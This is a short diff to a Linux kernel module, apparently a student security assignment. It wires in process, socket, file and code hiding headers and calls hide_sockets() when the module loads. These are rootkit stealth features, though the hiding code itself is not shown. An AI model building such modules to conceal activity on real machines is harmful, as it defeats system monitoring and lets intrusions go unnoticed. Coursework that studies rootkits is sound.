@@ -2,24 +2,30 @@
 #include <linux/kernel.h> /* Needed for KERN_INFO */
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 
+#include "process_hiding.h"
+#include "socket_hiding.h"
+#include "file_hiding.h"
+#include "code_hiding.h"
+
 #include "commands.h"
 #include "sysmap.h"
 
 MODULE_LICENSE("GPL");
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
-#define DRIVER_DESC   "Assigment 5 - Code Hiding"
+
+#define DRIVER_DESC   "Assigment 6 - Socket Hiding"
 
 static int __init mod_init(void)
 {
-  listen();
+  hide_sockets();
   printk(KERN_INFO "mod_init\n");
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
-  stop_listen();
+  unhide_sockets();
 }
 
 
